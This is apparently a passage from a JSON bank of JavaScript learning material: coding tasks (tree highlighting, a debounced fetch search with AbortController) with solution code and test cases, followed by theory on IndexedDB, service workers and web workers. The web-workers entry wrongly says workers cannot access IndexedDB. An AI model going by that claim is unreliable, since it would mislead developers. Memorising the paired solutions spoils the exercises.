          "startingCode": "document.addEventListener('DOMContentLoaded', () => {\n  const fileSystem = document.getElementById('fileSystem');\n\n  // Function to remove 'highlighted' class from all elements\n  function clearAllHighlights() {\n    document.querySelectorAll('.highlighted').forEach(el => el.classList.remove('highlighted'));\n  }\n\n  fileSystem.addEventListener('click', (event) => {\n    const clickedItem = event.target.closest('li'); // Find the clicked <li> or its ancestor\n\n    // TODO: Implement highlighting and de-highlighting logic here\n\n    if (clickedItem && fileSystem.contains(clickedItem)) {\n      clearAllHighlights(); // Start fresh\n\n      // 1. Highlight clicked item and its ancestors\n      let current = clickedItem;\n      while (current && current !== fileSystem) {\n        current.classList.add('highlighted');\n        current = current.parentElement.closest('li'); // Go up to the nearest parent LI\n      }\n\n      // 2. TODO: De-highlight siblings and their children\n      // Hint: Iterate through siblings of clickedItem and their descendants\n\n    } else {\n      // Clicking outside an <li> (but within fileSystem) should clear all highlights\n      clearAllHighlights();\n    }\n  });\n});\n",
          "solutionCode": "document.addEventListener('DOMContentLoaded', () => {\n  const fileSystem = document.getElementById('fileSystem');\n\n  // Function to remove 'highlighted' class from all elements\n  function clearAllHighlights() {\n    document.querySelectorAll('.highlighted').forEach(el => el.classList.remove('highlighted'));\n  }\n\n  fileSystem.addEventListener('click', (event) => {\n    const clickedItem = event.target.closest('li'); // Find the clicked <li> or its ancestor\n\n    // Prevent default actions for links if any, and stop propagation if needed\n    event.preventDefault(); // Prevents default link behavior if LIs contained <a>\n    // event.stopPropagation(); // Not strictly needed here, as we handle everything on fileSystem\n\n    if (clickedItem && fileSystem.contains(clickedItem)) { // Ensure the click is within an LI of our tree\n      clearAllHighlights(); // Start fresh before applying new highlights\n\n      // 1. Highlight clicked item and its ancestors\n      let current = clickedItem;\n      while (current && current !== fileSystem) {\n        current.classList.add('highlighted');\n        // Move up to the next parent <li> that is not the root fileSystem ul\n        // parentElement.closest('li') is robust for skipping intermediate ul/text nodes\n        current = current.parentElement.closest('li');\n      }\n\n      // 2. De-highlight siblings and their descendants\n      let node = clickedItem.parentNode.firstElementChild; // Start from the first child of the parent UL\n      while (node) {\n        if (node.tagName === 'LI' && node !== clickedItem) {\n          node.classList.remove('highlighted'); // Remove highlight from sibling LI\n\n          // Remove highlight from all descendants of this sibling\n          node.querySelectorAll('li.highlighted').forEach(descendant => {\n            descendant.classList.remove('highlighted');\n          });\n        }\n        node = node.nextElementSibling; // Move to the next sibling element\n      }\n\n    } else {\n      // Clicking outside any <li> (but within fileSystem, or a general click)\n      // This handles the reset requirement.\n      clearAllHighlights();\n    }\n  });\n});\n\n/* Add this CSS to your <style> tag or CSS file */\n/*\nbody { font-family: sans-serif; }\n\n#fileSystem {\n  border: 1px solid #ccc;\n  padding: 10px;\n  min-height: 150px;\n  background-color: #f9f9f9;\n  width: 300px;\n}\n\nul {\n  list-style-type: none;\n  padding-left: 20px;\n  margin: 0;\n}\n\nli {\n  cursor: pointer;\n  margin: 5px 0;\n  padding: 3px;\n  border: 1px solid transparent;\n  transition: background-color 0.2s ease, font-weight 0.2s ease;\n}\n\nli:hover {\n  border-color: #aaa;\n}\n\n.highlighted {\n  background-color: #ffe082; /* Light yellow */\n  font-weight: bold;\n  border-color: orange;\n}\n*/\n",
          "testCases": [
            "Clicking 'File A' should highlight 'File A' and 'Folder 1', and de-highlight 'File B', 'Folder 2', and 'File E'.",
            "Clicking 'File C' should highlight 'File C', 'Folder 2.1', and 'Folder 2'. All other items (File D, File E, Folder 1 and its children) should be de-highlighted.",
            "Clicking 'File E' should highlight only 'File E' and de-highlight all other elements in the tree.",
            "Repeated clicks on the same item should maintain its highlight.",
            "Clicking on a blank space within the `#fileSystem` container (but not on an `<li>`) should clear all highlights.",
            "Ensure performance is reasonable with nested structures (no noticeable lag)."
          ],
          "hints": [
            "Use `event.target.closest('li')` to get the actual `<li>` that was clicked, even if a child text node was clicked.",
            "To highlight ancestors, start from `clickedItem` and traverse upwards using `parentElement` or `closest('li')` in a loop until you reach `#fileSystem`.",
            "To de-highlight siblings and their children, you can get the `parentElement` of `clickedItem`, then iterate through its `children` (which are siblings). For each sibling that is *not* `clickedItem`, remove its highlight and recursively or iteratively remove highlights from its descendants using `querySelectorAll('.highlighted')` within that sibling's subtree.",
            "Remember to clear all existing highlights first (`clearAllHighlights()`) before applying new ones to ensure only the correct path is highlighted."
          ],
          "tags": [
            "DOM",
            "Traversal",
            "Event Delegation",
            "UI",
            "JavaScript",
            "Algorithm",
            "Tree Traversal"
          ],
          "timeEstimate": 90,
          "prerequisites": [
            "theory_dom_events",
            "theory_dom_traversal",
            "javascript_loops"
          ],
          "complexity": 9,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "event.target",
            "dom_manipulation",
            "tree_data_structures",
            "css_classes"
          ]
        },
        {
          "id": "task_ajax_fetch_api_1",
          "title": "User Search Component with API Integration and Cancellation",
          "description": "\nBuild a simple user search component that fetches user data from a mock API (`https://jsonplaceholder.typicode.com/users`) based on user input. The component should display search results and include functionality to cancel pending requests to optimize performance and user experience.\n\n**Requirements:**\n1.  **Search Input & Results Display:** An input field (`#searchInput`) for user queries and a `div` (`#resultsContainer`) to display matching user names.\n2.  **Fetch Users:** When the user types into the input field, fetch user data from `https://jsonplaceholder.typicode.com/users`. Filter the results to show users whose names contain the input text (case-insensitive).\n3.  **Display Results:** Display each matching user's `name` property in a list (`<ul>` or series of `div`s) within `#resultsContainer`.\n4.  **Debouncing:** Implement a debounce mechanism for the fetch requests. Requests should only be sent after the user stops typing for a short delay (e.g., 300-500ms).\n5.  **Request Cancellation:** Crucially, if a new request is triggered while a previous one is still pending (due to rapid typing), the *previous* request must be aborted using `AbortController`. This prevents outdated responses from being displayed and saves bandwidth.\n6.  **Loading Indicator:** Show a loading indicator (e.g., 'Loading...') while a request is in progress and hide it when results are displayed or an error occurs.\n7.  **Error Handling:** Display a user-friendly error message if the fetch request fails (network error or HTTP error like 404/500). Distinguish `AbortError` (for cancelled requests) from actual errors, and don't display an error message for an `AbortError`.\n8.  **No Results Message:** Display a 'No users found.' message if the filtered results are empty.\n\n**HTML Structure:**\n```html\n<div>\n  <input type=\"text\" id=\"searchInput\" placeholder=\"Search for users...\">\n  <p id=\"loadingIndicator\" style=\"display: none;\">Loading...</p>\n  <div id=\"resultsContainer\"></div>\n</div>\n```\n",
          "difficulty": "hard",
          "startingCode": "document.addEventListener('DOMContentLoaded', () => {\n  const searchInput = document.getElementById('searchInput');\n  const loadingIndicator = document.getElementById('loadingIndicator');\n  const resultsContainer = document.getElementById('resultsContainer');\n\n  let debounceTimer;      // Timer for debouncing\n  let currentController;  // AbortController for cancelling previous requests\n\n  function showLoading() {\n    loadingIndicator.style.display = 'block';\n    resultsContainer.innerHTML = ''; // Clear previous results\n  }\n\n  function hideLoading() {\n    loadingIndicator.style.display = 'none';\n  }\n\n  async function fetchUsers(query) {\n    showLoading();\n    \n    // TODO: Implement AbortController logic here:\n    // 1. If there's an old controller, abort it.\n    // 2. Create a new AbortController.\n    // 3. Pass its signal to the fetch request.\n\n    const url = 'https://jsonplaceholder.typicode.com/users';\n\n    try {\n      const response = await fetch(url /* , { signal: currentController.signal } */);\n      \n      if (!response.ok) {\n        throw new Error(`HTTP error! status: ${response.status}`);\n      }\n      \n      const users = await response.json();\n      const filteredUsers = users.filter(user => \n        user.name.toLowerCase().includes(query.toLowerCase())\n      );\n      \n      displayResults(filteredUsers);\n\n    } catch (error) {\n      // TODO: Handle AbortError specifically (don't show general error)\n      // TODO: Display general error message if it's not an AbortError\n      displayError(error.message);\n    } finally {\n      hideLoading();\n    }\n  }\n\n  function displayResults(users) {\n    resultsContainer.innerHTML = ''; // Clear previous results\n    if (users.length === 0) {\n      resultsContainer.innerHTML = '<p>No users found.</p>';\n    } else {\n      const ul = document.createElement('ul');\n      users.forEach(user => {\n        const li = document.createElement('li');\n        li.textContent = user.name;\n        ul.appendChild(li);\n      });\n      resultsContainer.appendChild(ul);\n    }\n  }\n\n  function displayError(message) {\n    resultsContainer.innerHTML = `<p style=\"color: red;\">Error: ${message}</p>`;\n  }\n\n  // TODO: Implement debouncing on searchInput 'input' event\n  // Clear existing timeout, set new timeout to call fetchUsers\n  searchInput.addEventListener('input', (event) => {\n    const query = event.target.value;\n    // Example of debouncing, but also need AbortController logic\n    // clearTimeout(debounceTimer);\n    // debounceTimer = setTimeout(() => {\n    //   if (query.length > 0) {\n    //     fetchUsers(query);\n    //   } else {\n    //     resultsContainer.innerHTML = '';\n    //     hideLoading();\n    //   }\n    // }, 500); // Debounce delay\n  });\n\n});\n",
          "solutionCode": "document.addEventListener('DOMContentLoaded', () => {\n  const searchInput = document.getElementById('searchInput');\n  const loadingIndicator = document.getElementById('loadingIndicator');\n  const resultsContainer = document.getElementById('resultsContainer');\n\n  let debounceTimer;      // Timer for debouncing\n  let currentController;  // Stores the AbortController for the currently active fetch request\n\n  function showLoading() {\n    loadingIndicator.style.display = 'block';\n    resultsContainer.innerHTML = ''; // Clear previous results immediately\n  }\n\n  function hideLoading() {\n    loadingIndicator.style.display = 'none';\n  }\n\n  async function fetchUsers(query) {\n    // If there's an ongoing request, abort it before starting a new one\n    if (currentController) {\n      currentController.abort();\n      console.log('Previous request aborted.');\n    }\n    \n    showLoading();\n\n    // Create a new AbortController for the current request\n    currentController = new AbortController();\n    const signal = currentController.signal;\n\n    const url = 'https://jsonplaceholder.typicode.com/users';\n\n    try {\n      const response = await fetch(url, { signal });\n      \n      if (!response.ok) {\n        // Read response text for more detailed error, if available\n        const errorBody = await response.text();\n        throw new Error(`HTTP error! status: ${response.status} - ${errorBody || response.statusText}`);\n      }\n      \n      const users = await response.json();\n      const filteredUsers = users.filter(user => \n        user.name.toLowerCase().includes(query.toLowerCase())\n      );\n      \n      displayResults(filteredUsers);\n\n    } catch (error) {\n      // Check if the error is due to an intentional abort\n      if (error.name === 'AbortError') {\n        console.log('Fetch request was cancelled by AbortController.');\n        // Do not display an error message to the user for cancellation\n        if (query.length === 0) { // If query is empty after abort, clear results\n          resultsContainer.innerHTML = '';\n        } else { // Otherwise, it means a newer request is coming or is active, so don't show 'No users found' just yet\n          // You might want to keep the loading indicator if a new fetch is about to start\n        }\n      } else {\n        // Display general error message for other types of errors (network, parsing, etc.)\n        displayError(error.message);\n        console.error('Fetch error:', error);\n      }\n    } finally {\n      // Hide loading indicator once the request (or abort) is handled\n      hideLoading();\n      // Clear the currentController reference if this fetch has completed (successfully or with error)\n      // This is important so the next fetch doesn't try to abort an already finished/cleared controller.\n      if (currentController && !currentController.signal.aborted) { // Only clear if it wasn't aborted by a newer request\n          currentController = null;\n      }\n    }\n  }\n\n  function displayResults(users) {\n    resultsContainer.innerHTML = ''; // Clear previous results\n    if (users.length === 0) {\n      resultsContainer.innerHTML = '<p>No users found.</p>';\n    } else {\n      const ul = document.createElement('ul');\n      ul.style.listStyleType = 'none';\n      ul.style.paddingLeft = '0';\n      users.forEach(user => {\n        const li = document.createElement('li');\n        li.textContent = user.name;\n        li.style.padding = '5px 0';\n        li.style.borderBottom = '1px solid #eee';\n        ul.appendChild(li);\n      });\n      resultsContainer.appendChild(ul);\n    }\n  }\n\n  function displayError(message) {\n    resultsContainer.innerHTML = `<p style=\"color: red;\">Error: ${message}</p>`;\n  }\n\n  // Implement debouncing on searchInput 'input' event\n  searchInput.addEventListener('input', (event) => {\n    const query = event.target.value.trim();\n\n    clearTimeout(debounceTimer);\n\n    if (query.length > 0) {\n      showLoading(); // Show loading immediately on input change\n      debounceTimer = setTimeout(() => {\n        fetchUsers(query);\n      }, 300); // Debounce delay: 300ms\n    } else {\n      // If query is empty, clear results and hide loading/errors\n      resultsContainer.innerHTML = '';\n      hideLoading();\n      // Abort any pending requests if user clears search field quickly\n      if (currentController) {\n        currentController.abort();\n        currentController = null;\n      }\n    }\n  });\n});\n\n/* Add this CSS to your <style> tag or CSS file */\n/*\nbody { font-family: sans-serif; padding: 20px; }\n#searchInput {\n  padding: 10px;\n  width: 300px;\n  font-size: 16px;\n  border: 1px solid #ccc;\n  border-radius: 4px;\n}\n#loadingIndicator {\n  color: #007bff;\n  font-style: italic;\n  margin-top: 10px;\n}\n#resultsContainer {\n  margin-top: 15px;\n  border: 1px solid #eee;\n  min-height: 100px;\n  padding: 10px;\n  border-radius: 4px;\n  background-color: #fcfcfc;\n}\n#resultsContainer p { margin: 5px 0; }\n*/\n",
          "testCases": [
            "Typing 'Leanne' should display 'Leanne Graham'.",
            "Typing 'Ervin' should display 'Ervin Howell'.",
            "Typing 'xxxx' (non-existent name) should display 'No users found.'.",
            "Typing rapidly (e.g., 'brev', 'brevi', 'brevitas') should only trigger one fetch request for 'brevitas' after the delay, and intermediate requests should be cancelled.",
            "Clearing the input field (`event.target.value = ''`) should clear results and hide loading/errors, and abort any pending requests.",
            "Simulate a network error (e.g., by fetching an invalid URL or blocking network for `jsonplaceholder.typicode.com`) and verify a descriptive error message is shown (and not an `AbortError` message if applicable).",
            "Verify loading indicator appears when typing starts and disappears when results or an error are displayed."
          ],
          "hints": [
            "The `currentController` variable should store the `AbortController` instance for the *most recent* active fetch request.",
            "Before starting a new `fetch` request, check if `currentController` exists. If it does, call `currentController.abort()` to cancel the previous request.",
            "When creating a new `fetch` request, assign a `new AbortController()` to `currentController` and pass `currentController.signal` to the fetch options.",
            "In the `catch` block of your `fetch` promise, differentiate `error.name === 'AbortError'` from other errors. Only display user-facing messages for non-abort errors.",
            "Ensure `hideLoading()` is called in the `finally` block of your `fetch` promise to cover both success and error scenarios.",
            "The `input` event listener is suitable for triggering the debounce logic."
          ],
          "tags": [
            "Fetch API",
            "AJAX",
            "AbortController",
            "Debouncing",
            "Async/Await",
            "Error Handling",
            "UI Component",
            "JavaScript"
          ],
          "timeEstimate": 120,
          "prerequisites": [
            "theory_ajax_fetch_api",
            "javascript_async_await",
            "javascript_promises",
            "javascript_closures"
          ],
          "complexity": 10,
          "interviewRelevance": 10,
          "learningPath": "advanced",
          "relatedConcepts": [
            "api_integration",
            "user_experience",
            "performance_optimization",
            "race_conditions"
          ]
        }
      ]
    }
  },
  {
    "id": "ae283dab-4a07-41f5-9615-89f841951e4f",
    "startLine": 11300,
    "endLine": 11399,
    "processedDate": "2025-06-17T12:17:58.636Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_indexeddb",
          "title": "IndexedDB: Client-Side NoSQL Database",
          "content": "IndexedDB is a low-level API for client-side storage of significant amounts of structured data, including files/blobs. It's a NoSQL database system built into browsers, providing a powerful alternative to `localStorage` or `sessionStorage` for more complex data storage needs.\n\n## Key Characteristics\n- **Persistence between sessions**: Data stored in IndexedDB remains available even after the user closes the browser or restarts their computer.\n- **Storage limit**: Significantly larger than `localStorage` (typically several hundred MBs, potentially more depending on browser and available disk space), making it suitable for large datasets.\n- **Supports complex data structures**: Can store JavaScript objects directly, including nested objects, arrays, Blobs, and Files, without needing explicit serialization/deserialization.\n- **Transactions and indexes**: Offers robust transaction support (ensuring data integrity and atomicity) and the ability to create indexes for efficient querying and searching, similar to traditional relational databases.\n- **Asynchronous API**: All operations are asynchronous, returning `IDBRequest` objects, which emit `success` or `error` events. This prevents blocking the main thread and keeps the UI responsive.\n- **Advanced Search Capabilities**: Allows searching data using cursors and indexes, providing more flexible and efficient query options compared to simple key-value stores.\n\n## Core Concepts\n- **Database (IDBDatabase)**: The top-level container for all data, identified by a name and version. Changes to the database structure (e.g., creating object stores, indexes) require incrementing the version.\n- **Object Store (IDBObjectStore)**: Similar to tables in a relational database. An object store holds records, where each record is a JavaScript object. Each object store must have a `keyPath` or `autoIncrement` property to uniquely identify records.\n- **Index (IDBIndex)**: A mechanism to efficiently look up records in an object store based on a specific property, similar to an index in a database table. Indexes can be unique or non-unique.\n- **Transaction (IDBTransaction)**: A crucial concept for ensuring data integrity. All read and write operations must occur within a transaction. Transactions are atomic: either all operations within them succeed, or none do. They can be `readonly` or `readwrite`.\n- **Request (IDBRequest)**: Most IndexedDB operations (e.g., `open`, `add`, `get`, `put`) return an `IDBRequest` object. The result of the operation is available in the `event.target.result` property of the `success` event handler.\n- **Cursor (IDBCursor)**: Used to iterate over records in an object store or index, allowing for efficient traversal and retrieval of multiple records.\n\n## IndexedDB Workflow Overview\n1.  **Open a Database**: Use `indexedDB.open()` to connect to an existing database or create a new one. This operation returns an `IDBOpenDBRequest`.\n2.  **Handle `onupgradeneeded`**: If the database version changes or it's created for the first time, this event fires. It's the *only* place where you can create or delete object stores and indexes.\n3.  **Handle `onsuccess`**: Once the database is successfully opened (or upgraded), this event fires. You can then start transactions to perform data operations.\n4.  **Perform Transactions**: Create a `readwrite` or `readonly` transaction on specific object stores. Get a reference to the `IDBObjectStore`.\n5.  **Data Operations (CRUD)**: Use methods like `add()`, `get()`, `put()`, `delete()`, `clear()` on the object store.\n6.  **Querying with Indexes**: Use `objectStore.index()` to get an `IDBIndex` object, then use methods like `get()` or `getAll()` on the index.\n7.  **Error Handling**: Always include `onerror` handlers for requests and transactions to gracefully manage failures.\n",
          "examples": [
            {
              "id": "example_indexeddb_open_setup",
              "title": "Opening Database and Creating Object Store/Indexes",
              "code": "const request = indexedDB.open('MyDatabase', 1);\n\nrequest.onupgradeneeded = function(event) {\n  const db = event.target.result;\n  // Create an object store named 'customers' with 'id' as the key path\n  const objectStore = db.createObjectStore('customers', { keyPath: 'id' });\n  \n  // Create indexes for faster searching\n  // 'name' index, based on 'name' property, not unique\n  objectStore.createIndex('name', 'name', { unique: false });\n  // 'email' index, based on 'email' property, must be unique\n  objectStore.createIndex('email', 'email', { unique: true });\n};\n\nrequest.onerror = function(event) {\n  console.error('Database error:', event.target.errorCode);\n};\n\nrequest.onsuccess = function(event) {\n  console.log('Database opened successfully.');\n  // Database is ready for transactions here\n  const db = event.target.result;\n  db.close(); // Close db after setup if no immediate operations\n};\n",
              "explanation": "This example demonstrates the initial setup for an IndexedDB database. It shows how to open a database, specify its version, and crucially, how to use the `onupgradeneeded` event to define object stores and create indexes. The `keyPath` defines the unique identifier for records, while `createIndex` allows for efficient retrieval of data based on other properties. Error handling is also included.",
              "language": "javascript"
            },
            {
              "id": "example_indexeddb_crud",
              "title": "Performing CRUD Operations",
              "code": "const request = indexedDB.open('MyDatabase', 1);\n\nrequest.onsuccess = function(event) {\n  const db = event.target.result;\n  \n  // Start a readwrite transaction for the 'customers' object store\n  const transaction = db.transaction(['customers'], 'readwrite');\n  const objectStore = transaction.objectStore('customers');\n  \n  // --- Add Data ---\n  const customerData = { id: 1, name: 'John Doe', email: 'john@example.com', age: 30 };\n  const addRequest = objectStore.add(customerData);\n  addRequest.onsuccess = () => console.log('Customer added:', customerData);\n  addRequest.onerror = (e) => console.error('Add error:', e.target.error);\n\n  // --- Read Data ---\n  const getRequest = objectStore.get(1);\n  getRequest.onsuccess = function(event) {\n    const customer = event.target.result;\n    console.log('Customer retrieved:', customer);\n  };\n  getRequest.onerror = (e) => console.error('Get error:', e.target.error);\n\n  // --- Update Data ---\n  // Note: 'put' can add if key doesn't exist, or update if it does.\n  const updatedCustomerData = { ...customerData, age: 31 };\n  const updateRequest = objectStore.put(updatedCustomerData);\n  updateRequest.onsuccess = () => console.log('Customer updated:', updatedCustomerData);\n  updateRequest.onerror = (e) => console.error('Update error:', e.target.error);\n  \n  // --- Delete Data ---\n  const deleteRequest = objectStore.delete(1);\n  deleteRequest.onsuccess = () => console.log('Customer deleted with ID 1.');\n  deleteRequest.onerror = (e) => console.error('Delete error:', e.target.error);\n\n  // --- Use an index to search ---\n  const nameIndex = objectStore.index('name');\n  const nameSearchRequest = nameIndex.getAll('John Doe'); // Get all records where 'name' is 'John Doe'\n  nameSearchRequest.onsuccess = function(event) {\n    const matches = event.target.result;\n    console.log('Customers with name \"John Doe\":', matches);\n  };\n  nameSearchRequest.onerror = (e) => console.error('Index search error:', e.target.error);\n\n  // A transaction completes when all its requests complete and there are no new requests.\n  transaction.oncomplete = () => console.log('Transaction completed.');\n  transaction.onerror = (e) => console.error('Transaction error:', e.target.error);\n};\n",
              "explanation": "This example illustrates performing common CRUD (Create, Read, Update, Delete) operations using IndexedDB within a `readwrite` transaction. It demonstrates `add()` for inserting new records, `get()` for retrieving by `keyPath`, `put()` for updating existing records (or adding if not present), and `delete()` for removing records. Crucially, it also shows how to leverage a previously defined index (`nameIndex`) to search for records based on a non-key property using `getAll()`. Each operation is asynchronous and uses `onsuccess`/`onerror` callbacks.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_indexeddb_mcq_1",
            "question_indexeddb_open_1",
            "question_indexeddb_code_1",
            "question_indexeddb_flashcard_1",
            "question_indexeddb_mcq_2",
            "question_indexeddb_open_2",
            "question_indexeddb_flashcard_2"
          ],
          "relatedTasks": [
            "task_indexeddb_crud_manager",
            "task_indexeddb_search_filter"
          ],
          "tags": [
            "IndexedDB",
            "Client-Side Storage",
            "Offline",
            "Persistence",
            "Database",
            "NoSQL"
          ],
          "technology": "Web APIs",
          "prerequisites": [
            "Asynchronous JavaScript",
            "Event Handling",
            "Promises (basic understanding)"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "advanced",
          "requiredFor": [
            "Progressive Web Apps",
            "Offline-first Applications",
            "Large-scale Client-side Data Management"
          ]
        },
        {
          "id": "theory_service_workers",
          "title": "Service Workers: Enhancing Offline Experiences and Performance",
          "content": "Service Workers are a type of Web Worker (though with distinct capabilities) that act as a programmable network proxy, sitting between your web application and the network. They enable powerful features like offline experiences, push notifications, and background synchronization by intercepting network requests and caching assets.\n\n## Key Characteristics and Benefits\n- **Offline Capabilities**: The most prominent feature. Service Workers can cache static assets (HTML, CSS, JS, images), API responses, and other resources. When a user is offline or has a poor network connection, the Service Worker can serve content directly from the cache, providing a seamless user experience.\n- **Network Interception**: They can intercept network requests made by the page and decide how to respond – either by serving cached content, fetching from the network, or a combination.\n- **Background Sync**: Allows deferring actions until the user has stable connectivity. For example, sending an email when online again.\n- **Push Notifications**: Enables web applications to receive messages pushed from a server even when the user is not actively using the application.\n- **Performance Improvement**: By caching assets, Service Workers can drastically reduce page load times for returning visitors.\n- **Lifecycle**: Service Workers have a distinct lifecycle (installing, installed/waiting, activating, activated). Updates involve a new Service Worker installing in the background and waiting to activate until all controlled pages are closed.\n- **HTTPS Only**: For security reasons, Service Workers can only be registered and used over HTTPS (or `localhost`).\n\n## Integration with Create React App\n`create-react-app` (CRA) projects include a default Service Worker setup that provides out-of-the-box offline capabilities. By default, it uses Workbox, a Google library for Service Workers, to pre-cache all static assets built by webpack.\n\n- **`serviceWorker.register()`**: This function, typically found in `src/index.js` in a CRA project, initiates the Service Worker registration process. When called, the browser attempts to download and install the `service-worker.js` file.\n- **`serviceWorker.unregister()`**: If you wish to disable the default Service Worker (e.g., if you don't need offline capabilities or want to implement your own), you can call this function. This unregisters the Service Worker and clears any caches it manages.\n\n## How it Works (Simplified)\n1.  **Registration**: Your main script calls `navigator.serviceWorker.register('./service-worker.js')`.\n2.  **Installation**: The browser downloads `service-worker.js`. In the `install` event, the Service Worker typically pre-caches essential assets.\n3.  **Activation**: After successful installation, the `activate` event fires. At this point, the Service Worker takes control of the page.\n4.  **Fetching**: For subsequent page loads and network requests, the Service Worker intercepts them via the `fetch` event. It can then decide whether to serve from cache (`CacheStorage` API), fetch from the network, or a combination (e.g., 'cache first, then network' strategy).\n",
          "examples": [
            {
              "id": "example_service_worker_cra_default",
              "title": "Default Service Worker in Create React App",
              "code": "// In src/index.js of a create-react-app project\nimport React from 'react';\nimport ReactDOM from 'react-dom';\nimport './index.css';\nimport App from './App';\nimport * as serviceWorker from './serviceWorker'; // Imports the default service worker logic\n\nReactDOM.render(<App />, document.getElementById('root'));\n\n// Register the service worker for offline capabilities\n// This function handles the registration and lifecycle events for you.\nserviceWorker.register();\n\n// If you want to opt-out of the default service worker, use:\n// serviceWorker.unregister();\n",
              "explanation": "This example shows the standard `index.js` file from a Create React App project. The `import * as serviceWorker from './serviceWorker';` line imports a utility module provided by CRA. Calling `serviceWorker.register()` enables the default offline caching behavior. Calling `serviceWorker.unregister()` disables it, which might be useful if you're not building a PWA or want to implement custom caching strategies.",
              "language": "javascript"
            },
            {
              "id": "example_service_worker_fetch_strategy",
              "title": "Service Worker Cache-First Fetch Strategy (Conceptual)",
              "code": "// Inside service-worker.js (conceptual, simplified)\n\nconst CACHE_NAME = 'my-app-cache-v1';\nconst urlsToCache = [\n  '/',\n  '/index.html',\n  '/styles/main.css',\n  '/scripts/app.js',\n  '/images/logo.png'\n];\n\nself.addEventListener('install', event => {\n  console.log('Service Worker: Installing...');\n  event.waitUntil(\n    caches.open(CACHE_NAME)\n      .then(cache => {\n        console.log('Service Worker: Caching app shell');\n        return cache.addAll(urlsToCache);\n      })\n  );\n});\n\nself.addEventListener('fetch', event => {\n  event.respondWith(\n    caches.match(event.request)\n      .then(response => {\n        // Cache hit - return response\n        if (response) {\n          console.log('Service Worker: Serving from cache:', event.request.url);\n          return response;\n        }\n        // No cache hit - fetch from network\n        console.log('Service Worker: Fetching from network:', event.request.url);\n        return fetch(event.request);\n      })\n  );\n});\n\nself.addEventListener('activate', event => {\n  console.log('Service Worker: Activating...');\n  event.waitUntil(\n    caches.keys().then(cacheNames => {\n      return Promise.all(\n        cacheNames.map(cacheName => {\n          if (cacheName !== CACHE_NAME) {\n            console.log('Service Worker: Deleting old cache:', cacheName);\n            return caches.delete(cacheName);\n          }\n        })\n      );\n    })\n  );\n});\n",
              "explanation": "This conceptual example illustrates a common 'cache-first' strategy within a `service-worker.js` file. During the `install` event, essential static assets (`urlsToCache`) are pre-cached. In the `fetch` event, the Service Worker first checks if the requested resource is in the cache (`caches.match`). If found, it serves from the cache immediately. Otherwise, it fetches the resource from the network. The `activate` event is used to clean up old caches, ensuring only the current version's assets are retained.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_service_worker_mcq_1",
            "question_service_worker_open_1",
            "question_service_worker_code_1",
            "question_service_worker_flashcard_1",
            "question_service_worker_mcq_2",
            "question_service_worker_open_2",
            "question_service_worker_flashcard_2"
          ],
          "relatedTasks": [
            "task_service_worker_offline_page",
            "task_service_worker_dynamic_caching"
          ],
          "tags": [
            "Service Workers",
            "PWA",
            "Offline",
            "Caching",
            "Web APIs",
            "Performance",
            "React",
            "Create React App"
          ],
          "technology": "Web APIs",
          "prerequisites": [
            "Asynchronous JavaScript",
            "HTTP/Network basics"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "requiredFor": [
            "Progressive Web Apps",
            "Offline-first Applications",
            "Frontend Performance Optimization"
          ]
        },
        {
          "id": "theory_web_workers",
          "title": "Web Workers: Running Scripts in Background Threads",
          "content": "Web Workers provide a way to run scripts in a background thread, separate from the main thread of execution (where the user interface and most JavaScript runs). This prevents long-running or computationally intensive tasks from blocking the UI, ensuring a smoother and more responsive user experience.\n\n## Key Characteristics and Benefits\n- **Non-blocking UI**: The primary benefit. By offloading heavy computations to a background thread, the main thread remains free to handle user interactions, animations, and rendering, preventing UI freezes.\n- **Concurrency**: Allows for parallel execution of JavaScript code.\n- **Message-based Communication**: Web Workers communicate with the main thread (and other workers) by sending messages using `postMessage()` and receiving messages via the `onmessage` event handler.\n- **Isolated Global Scope**: Each worker runs in its own global context, different from the `window` object of the main thread.\n- **Limitations**: Web Workers do *not* have direct access to the DOM (`document` object), the `window` object, or many global variables/functions available on the main thread. They also cannot access local storage or IndexedDB directly (though they can communicate with the main thread to request such operations).\n- **Types of Workers**: Besides Dedicated Workers (the most common type, one worker per script), there are also Shared Workers (multiple scripts can access the same worker instance) and Service Workers (a specific type for network proxying and offline capabilities, as discussed previously).\n\n## Basic Usage\n1.  **Create a Worker Instance**: In the main thread, instantiate a `Worker` object, providing the URL of the worker script.\n2.  **Send Messages**: Use `worker.postMessage(data)` to send data (which is copied, not shared) from the main thread to the worker, or vice-versa.\n3.  **Receive Messages**: Set up an `onmessage` event handler on the worker instance (in the main thread) or `self.onmessage` (in the worker script) to receive messages.\n4.  **Terminate Worker**: Use `worker.terminate()` to immediately stop the worker, freeing up resources.\n",
          "examples": [
            {
              "id": "example_web_worker_basic",
              "title": "Basic Web Worker Communication",
              "code": "// In main.js (or directly in your HTML script)\nconst worker = new Worker('worker.js'); // Create a new Web Worker instance\n\n// Listen for messages from the worker\nworker.onmessage = function(event) {\n  console.log('Main thread received from Worker:', event.data);\n};\n\n// Handle errors from the worker\nworker.onerror = function(error) {\n  console.error('Web Worker Error:', error);\n};\n\n// Send a message to the worker\nworker.postMessage('Hello Worker from Main Thread!');\n\n// You can also terminate the worker when no longer needed\n// setTimeout(() => {\n//   worker.terminate();\n//   console.log('Worker terminated.');\n// }, 5000);\n\n// In worker.js\nself.onmessage = function(event) {\n  const receivedData = event.data;\n  console.log('Worker received from Main Thread:', receivedData);\n  \n  // Perform some heavy computation (example)\n  let sum = 0;\n  for (let i = 0; i < 1000000000; i++) {\n    sum += i;\n  }\n  \n  // Send a message back to the main thread\n  self.postMessage(`Computation finished! Sum: ${sum}`);\n};\n\nself.onerror = function(error) {\n  console.error('Worker Script Error:', error);\n};\n",
              "explanation": "This example demonstrates the fundamental communication pattern between the main thread and a Web Worker. The `main.js` script creates a `Worker` instance and sends a message using `postMessage()`. It then listens for messages back from the worker using `onmessage`. The `worker.js` script receives the message via `self.onmessage`, performs a simulated heavy computation, and then sends the result back to the main thread using `self.postMessage()`. This allows the heavy task to run without freezing the UI.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_web_worker_mcq_1",
            "question_web_worker_open_1",
            "question_web_worker_code_1",
            "question_web_worker_flashcard_1",
            "question_web_worker_mcq_2",
            "question_web_worker_open_2",
